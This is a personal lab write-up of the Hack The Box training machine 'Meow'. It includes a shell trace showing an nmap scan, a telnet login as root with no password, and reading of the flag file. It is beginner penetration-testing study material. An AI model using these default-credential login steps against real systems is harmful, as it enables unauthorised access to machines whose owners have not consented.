## Box: [Meow] — Started: 25-09-27

**IP/Host:** `HTB attackbox`  |  **Status:** `Owned: 25-09-27`

### TL;DR

Initial: `nmap -sV IPADDR`. PrivEsc: [`telnet IPADDR`].

### Key Steps

1. *Validation*: HTB ctf
2. *Scanning/Recon*: `nmap -sV IPADDR`
3. *Exploits/Findings*: `cat flag.txt`
4. *PrivEsc/Persistence*: N/A
5. *Proof — path to flags/screenshot of boxpwn*: Cat'd flag in home folder
![[Pasted image 20251005004421.png]]

### Quick Notes
- *Recon*: 
    nmap -sV revealed an open Telnet port on 23. 
- *Access*: 
    - Attempting a default login of "root" 
- *Stuck*: 
    - Mostly instructional, wasn't sure what the lesson plan wanted me to answer for `What service do we use to form our VPN connection into HTB labs?` (OpenVPN was the answer) because I was technically not using OpenVPN personally (I was directly, but out of sight out of mind). So I got started going through the walkthrough until it came to me. While I was waiting for `nmap` to finish.


### Commands

**full trace**:

```shell
┌─[us-starting-point-1-dhcp]─[10.10.14.51]─[htb-mp-954215@htb-w2ldmkeadm]─[~]
└──╼ [★]$ ping 10.129.14.231
PING 10.129.14.231 (10.129.14.231) 56(84) bytes of data.
64 bytes from 10.129.14.231: icmp_seq=1 ttl=63 time=9.26 ms
64 bytes from 10.129.14.231: icmp_seq=2 ttl=63 time=9.08 ms
64 bytes from 10.129.14.231: icmp_seq=3 ttl=63 time=8.98 ms
^C
--- 10.129.14.231 ping statistics ---
3 packets transmitted, 3 received, 0% packet loss, time 2002ms
rtt min/avg/max/mdev = 8.975/9.103/9.257/0.116 ms
┌─[us-starting-point-1-dhcp]─[10.10.14.51]─[htb-mp-954215@htb-w2ldmkeadm]─[~]
└──╼ [★]$ nmap -sV 10.129.14.231
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-09-26 23:29 CDT
Nmap scan report for 10.129.14.231
Host is up (0.011s latency).
Not shown: 999 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
23/tcp open  telnet  Linux telnetd
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 10.59 seconds
┌─[us-starting-point-1-dhcp]─[10.10.14.51]─[htb-mp-954215@htb-w2ldmkeadm]─[~]
└──╼ [★]$ telnet 10.129.14.231
Trying 10.129.14.231...
Connected to 10.129.14.231.
Escape character is '^]'.

  █  █         ▐▌     ▄█▄ █          ▄▄▄▄
  █▄▄█ ▀▀█ █▀▀ ▐▌▄▀    █  █▀█ █▀█    █▌▄█ ▄▀▀▄ ▀▄▀
  █  █ █▄█ █▄▄ ▐█▀▄    █  █ █ █▄▄    █▌▄█ ▀▄▄▀ █▀█


Meow login: root
Welcome to Ubuntu 20.04.2 LTS (GNU/Linux 5.4.0-77-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Sat 27 Sep 2025 04:31:22 AM UTC

  System load:           0.0
  Usage of /:            41.7% of 7.75GB
  Memory usage:          4%
  Swap usage:            0%
  Processes:             135
  Users logged in:       0
  IPv4 address for eth0: 10.129.14.231
  IPv6 address for eth0: dead:beef::250:56ff:feb0:8e51

 * Super-optimized for small spaces - read how we shrank the memory
   footprint of MicroK8s to make it the smallest full K8s around.

   https://ubuntu.com/blog/microk8s-memory-optimisation

75 updates can be applied immediately.
31 of these updates are standard security updates.
To see these additional updates run: apt list --upgradable


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

Last login: Mon Sep  6 15:15:23 UTC 2021 from 10.10.14.18 on pts/0
root@Meow:~# ls
flag.txt  snap
root@Meow:~# cat flag.txt 
[FLAG.TXT]
root@Meow:~# 

```
